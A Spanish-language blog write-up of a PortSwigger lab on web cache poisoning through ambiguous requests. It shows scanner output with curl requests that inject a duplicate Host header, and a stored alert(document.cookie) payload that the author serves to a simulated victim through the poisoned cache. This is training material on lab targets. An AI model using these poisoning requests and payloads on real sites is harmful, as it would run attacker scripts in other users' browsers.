---
title: Web cache poisoning via ambiguous requests
description: Laboratorio de Portswigger sobre HTTP Host Header Attacks
date: 2026-04-03 12:30:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Labs
  - HTTP Host Header Attacks
tags:
  - Portswigger Labs
  - HTTP Host Header Attacks
  - Web cache poisoning via ambiguous requests
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este laboratorio es vulnerable a web cache poisoning debido a `discrepancias en cómo la caché y la aplicación del back-end manejan solicitudes ambiguas`. Un usuario desprevenido visita regularmente la `página principal del sitio web`. Para resolver el laboratorio, tenemos que envenenar la `caché para que la página principal ejecute alert(document.cookie) en el navegador de la víctima`

---

## Resolución

Al acceder a la web vemos esto

![](/assets/img/HTTP-Host-Header-Attacks-Lab-3/image_1.png)

En este laboratorio he crawleado la web mediante Burpsuite. Para hacer esto, he `añadido el dominio al scope`, posteriormente me he dirigido a `Target > Site map`, he hecho `click derecho sobre el dominio > Scan y he seleccionado la opción Crawl`

![](/assets/img/HTTP-Host-Header-Attacks-Lab-3/image_2.png)

![](/assets/img/HTTP-Host-Header-Attacks-Lab-3/image_3.png)

`Me ha llamado la atención este archivo porque a parte de almacenarse en caché, luce así en el código fuente`. Por lo tanto, `si hubiera alguna forma de manipular el Host y proporcionar nosotros uno, podríamos llevar a cabo un web cache poisoning`

![](/assets/img/HTTP-Host-Header-Attacks-Lab-3/image_4.png)

![](/assets/img/HTTP-Host-Header-Attacks-Lab-3/image_5.png)

Para identificar si existe un web cache poisoning, he usado la `herramienta Web-Cache-Vulnerability-Scanner` [https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner.git](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner.git). Como podemos ver aquí, me ha identificado que `al modificar el valor de la cabecera Host, este nuevo valor se refleja en la respuesta`

```
Web-Cache-Vulnerability-Scanner -u https://0ac4003404ea099480e21c57002800ab.h1-web-security-academy.net/

__/\\____/\\___/\\_____/\\\\\\\\__/\\\____/\\\__/\\\\\\\\\\_     
 _\/\\\__/\\\\_/\\\___/\\\//////__\//\\\__/\\\__\/\\\//////__    
  _\//\\\/\\\\\/\\\___/\\\__________\//\\\/\\\___\/\\\\\\\\\\_   
   __\//\\\\\/\\\\\___\//\\\__________\//\\\\\____\////////\\\_  
    ___\//\\\\//\\\_____\///\\\\\\\\____\//\\\______/\\\\\\\\\\_ 
     ____\///__\///________\////////______\///______\//////////__
WCVS - the Web Cache Vulnerability Scanner. (v2.0.0)

Published by Hackmanit under http://www.apache.org/licenses/LICENSE-2.0
Author: Maximilian Hildebrand
Repository: https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner

WCVS v2.0.0 started at 2026-03-30_17-10-01

Testing website(1/1): https://0ac4003404ea099480e21c57002800ab.h1-web-security-academy.net/
===============================================================
[*] The default status code was set to 200
[*] Cache-Control header was found: [max-age=30] 
[*] Age header was found: [1]
[*] X-Cache header was found: [hit] 
[*] The following cache indicator indicated a hit: Age
[*] The following cache indicator indicated a hit: X-Cache
[*] Parameter cbwcvs as Cachebuster was successful (Parameter)

 --------------------------------------------------------------
| Web Cache Deception
 --------------------------------------------------------------
[!] The response already gets cached!

 --------------------------------------------------------------
| Cookie Poisoning
 --------------------------------------------------------------
Checking cookie session (1/2)
Overwriting session=JwBa1NEeRs4xFqaia3mOalguahpuodS1 with session=p117421534640
Checking cookie _lab (2/2)
Overwriting _lab=47%7cMC0CFCJq1XehM0MgRjiQm6zwTeb0ExM5AhUAjkXUmMVqjBFdfjJeNgNFmSWI2FFJSCxaiAm4BcKqEdKsP8CFOIZzElT%2fv5FuWkWlmJj4XXdW5KyeMWonownCKuRL%2bDtZPjk40j89C9tYJeQfNe3AkSFUfXjmcmgz%2fmQsTcO8n6oUSxwNKYq%2b with _lab=p711816628691
[!] Unexpected Status Code 400 for 1st request of _lab=47%7cMC0CFCJq1XehM0MgRjiQm6zwTeb0ExM5AhUAjkXUmMVqjBFdfjJeNgNFmSWI2FFJSCxaiAm4BcKqEdKsP8CFOIZzElT%2fv5FuWkWlmJj4XXdW5KyeMWonownCKuRL%2bDtZPjk40j89C9tYJeQfNe3AkSFUfXjmcmgz%2fmQsTcO8n6oUSxwNKYq%2b
[*] _lab=47%7cMC0CFCJq1XehM0MgRjiQm6zwTeb0ExM5AhUAjkXUmMVqjBFdfjJeNgNFmSWI2FFJSCxaiAm4BcKqEdKsP8CFOIZzElT%2fv5FuWkWlmJj4XXdW5KyeMWonownCKuRL%2bDtZPjk40j89C9tYJeQfNe3AkSFUfXjmcmgz%2fmQsTcO8n6oUSxwNKYq%2b: Status Code 400 differed from 200

 --------------------------------------------------------------
| CSS Poisoning
 --------------------------------------------------------------
Testing the following CSS files for poisoning
[https://0ac4003404ea099480e21c57002800ab.h1-web-security-academy.net/resources/labheader/css/academyLabHeader.css https://0ac4003404ea099480e21c57002800ab.h1-web-security-academy.net/resources/css/labsEcommerce.css]

 --------------------------------------------------------------
| Multiple Forwarding Headers Poisoning
 --------------------------------------------------------------
[*] Host: Response Body contained 0ac4003404ea099480e21c57002800ab.h1-web-security-academy.net:31337

[+] [Host] was successfully poisoned! cachebuster cbwcvs: cb932300864748 poison: [0ac4003404ea099480e21c57002800ab.h1-web-security-academy.net:31337]
[+] URL: https://0ac4003404ea099480e21c57002800ab.h1-web-security-academy.net/
[+] Reason: Reflection Body: Response Body contained poison value 0ac4003404ea099480e21c57002800ab.h1-web-security-academy.net:31337 1 times
[+] Reflections: "text/javascript" src="//0ac4003404ea099480e21c57002800ab.h1-web-security-academy.net:31337/resources/js/tracking.js
[+] Curl 1st Request: curl -X 'GET' -H 'Cookie: session=JwBa1NEeRs4xFqaia3mOalguahpuodS1; _lab=47%7cMC0CFCJq1XehM0MgRjiQm6zwTeb0ExM5AhUAjkXUmMVqjBFdfjJeNgNFmSWI2FFJSCxaiAm4BcKqEdKsP8CFOIZzElT%2fv5FuWkWlmJj4XXdW5KyeMWonownCKuRL%2bDtZPjk40j89C9tYJeQfNe3AkSFUfXjmcmgz%2fmQsTcO8n6oUSxwNKYq%2b' -H 'Host: 0ac4003404ea099480e21c57002800ab.h1-web-security-academy.net:31337' -H 'User-Agent: WebCacheVulnerabilityScanner v2.0.0' 'https://0ac4003404ea099480e21c57002800ab.h1-web-security-academy.net/?cbwcvs=cb932300864748'
[+] Curl 2nd Request: curl -X 'GET' -H 'Cookie: session=JwBa1NEeRs4xFqaia3mOalguahpuodS1; _lab=47%7cMC0CFCJq1XehM0MgRjiQm6zwTeb0ExM5AhUAjkXUmMVqjBFdfjJeNgNFmSWI2FFJSCxaiAm4BcKqEdKsP8CFOIZzElT%2fv5FuWkWlmJj4XXdW5KyeMWonownCKuRL%2bDtZPjk40j89C9tYJeQfNe3AkSFUfXjmcmgz%2fmQsTcO8n6oUSxwNKYq%2b' -H 'Host: 0ac4003404ea099480e21c57002800ab.h1-web-security-academy.net' -H 'User-Agent: WebCacheVulnerabilityScanner v2.0.0' 'https://0ac4003404ea099480e21c57002800ab.h1-web-security-academy.net/?cbwcvs=cb932300864748'

[!] Unexpected Status Code 500 for 1st request of Host
[*] Host: Status Code 500 differed from 200
[!] Unexpected Status Code 504 for 1st request of Host
[*] Host: Response Body contained 0ac4003404ea099480e21c57002800ab.h1-web-security-academy.net 31337
[!] Unexpected Status Code 504 for 1st request of Host
[*] Host: Response Body contained 0ac4003404ea099480e21c57002800ab.h1-web-security-academy.net.p374014997070
[!] Unexpected Status Code 504 for 1st request of Host
[*] Host: Response Body contained p951754658793.0ac4003404ea099480e21c57002800ab.h1-web-security-academy.net
[!] Unexpected Status Code 504 for 1st request of Host
[*] Host: Response Body contained p174489817284
[*] Host: Response Body contained p652482332785

[+] [Host] was successfully poisoned! cachebuster cbwcvs: cb222599772802 poison: [p652482332785]
[+] URL: https://0ac4003404ea099480e21c57002800ab.h1-web-security-academy.net/
[+] Reason: Reflection Body: Response Body contained poison value p652482332785 1 times
[+] Reflections: "text/javascript" src="//p652482332785/resources/js/tracking.js
[+] Curl 1st Request: curl -X 'GET' -H 'Cookie: session=JwBa1NEeRs4xFqaia3mOalguahpuodS1; _lab=47%7cMC0CFCJq1XehM0MgRjiQm6zwTeb0ExM5AhUAjkXUmMVqjBFdfjJeNgNFmSWI2FFJSCxaiAm4BcKqEdKsP8CFOIZzElT%2fv5FuWkWlmJj4XXdW5KyeMWonownCKuRL%2bDtZPjk40j89C9tYJeQfNe3AkSFUfXjmcmgz%2fmQsTcO8n6oUSxwNKYq%2b' -H 'Host: 0ac4003404ea099480e21c57002800ab.h1-web-security-academy.net
Host: p652482332785' -H 'User-Agent: WebCacheVulnerabilityScanner v2.0.0' 'https://0ac4003404ea099480e21c57002800ab.h1-web-security-academy.net/?cbwcvs=cb222599772802'
[+] Curl 2nd Request: curl -X 'GET' -H 'Cookie: session=JwBa1NEeRs4xFqaia3mOalguahpuodS1; _lab=47%7cMC0CFCJq1XehM0MgRjiQm6zwTeb0ExM5AhUAjkXUmMVqjBFdfjJeNgNFmSWI2FFJSCxaiAm4BcKqEdKsP8CFOIZzElT%2fv5FuWkWlmJj4XXdW5KyeMWonownCKuRL%2bDtZPjk40j89C9tYJeQfNe3AkSFUfXjmcmgz%2fmQsTcO8n6oUSxwNKYq%2b' -H 'Host: 0ac4003404ea099480e21c57002800ab.h1-web-security-academy.net' -H 'User-Agent: WebCacheVulnerabilityScanner v2.0.0' 'https://0ac4003404ea099480e21c57002800ab.h1-web-security-academy.net/?cbwcvs=cb222599772802'

[!] Unexpected Status Code 504 for 1st request of hOsT
[*] hOsT: Response Body contained p757029610489
[*] hOsT: Response Body contained p163962381483

[+] [hOsT] was successfully poisoned! cachebuster cbwcvs: cb621752324352 poison: [p163962381483]
[+] URL: https://0ac4003404ea099480e21c57002800ab.h1-web-security-academy.net/
[+] Reason: Reflection Body: Response Body contained poison value p163962381483 1 times
[+] Reflections: "text/javascript" src="//p163962381483/resources/js/tracking.js
[+] Curl 1st Request: curl -X 'GET' -H 'Cookie: session=JwBa1NEeRs4xFqaia3mOalguahpuodS1; _lab=47%7cMC0CFCJq1XehM0MgRjiQm6zwTeb0ExM5AhUAjkXUmMVqjBFdfjJeNgNFmSWI2FFJSCxaiAm4BcKqEdKsP8CFOIZzElT%2fv5FuWkWlmJj4XXdW5KyeMWonownCKuRL%2bDtZPjk40j89C9tYJeQfNe3AkSFUfXjmcmgz%2fmQsTcO8n6oUSxwNKYq%2b' -H 'Host: 0ac4003404ea099480e21c57002800ab.h1-web-security-academy.net
hOsT: p163962381483' -H 'User-Agent: WebCacheVulnerabilityScanner v2.0.0' 'https://0ac4003404ea099480e21c57002800ab.h1-web-security-academy.net/?cbwcvs=cb621752324352'
[+] Curl 2nd Request: curl -X 'GET' -H 'Cookie: session=JwBa1NEeRs4xFqaia3mOalguahpuodS1; _lab=47%7cMC0CFCJq1XehM0MgRjiQm6zwTeb0ExM5AhUAjkXUmMVqjBFdfjJeNgNFmSWI2FFJSCxaiAm4BcKqEdKsP8CFOIZzElT%2fv5FuWkWlmJj4XXdW5KyeMWonownCKuRL%2bDtZPjk40j89C9tYJeQfNe3AkSFUfXjmcmgz%2fmQsTcO8n6oUSxwNKYq%2b' -H 'Host: 0ac4003404ea099480e21c57002800ab.h1-web-security-academy.net' -H 'User-Agent: WebCacheVulnerabilityScanner v2.0.0' 'https://0ac4003404ea099480e21c57002800ab.h1-web-security-academy.net/?cbwcvs=cb621752324352'
```

He intentado modificar el valor directamente pero no ha dado resultado

![](/assets/img/HTTP-Host-Header-Attacks-Lab-3/image_6.png)

Sin embargo, `he añadido una nueva cabecera Host` y en este caso, `sí que ha funcionado`. Además, `la cabecera X-Cache: hit nos está diciendo que la respuesta está siendo almacenada en caché`

![](/assets/img/HTTP-Host-Header-Attacks-Lab-3/image_7.png)

Una vez sabemos esto, vamos a crear un payload. Para ello, lo primero es modificar el `content-type y la ruta del payload`

![](/assets/img/HTTP-Host-Header-Attacks-Lab-3/image_8.png)

Lo siguiente es pegar este payload en el body y pulsar en Store

```
alert(document.cookie)
```

![](/assets/img/HTTP-Host-Header-Attacks-Lab-3/image_9.png)

Una vez hemos hecho esto, el último paso es `envenenar la caché nuevamente pero haciendo que apunte a nuestro Exploit server`

![](/assets/img/HTTP-Host-Header-Attacks-Lab-3/image_10.png)

`Para comprobar si funciona, debemos de acceder a la página principal y ver si nos salta esta alerta`

![](/assets/img/HTTP-Host-Header-Attacks-Lab-3/image_11.png)
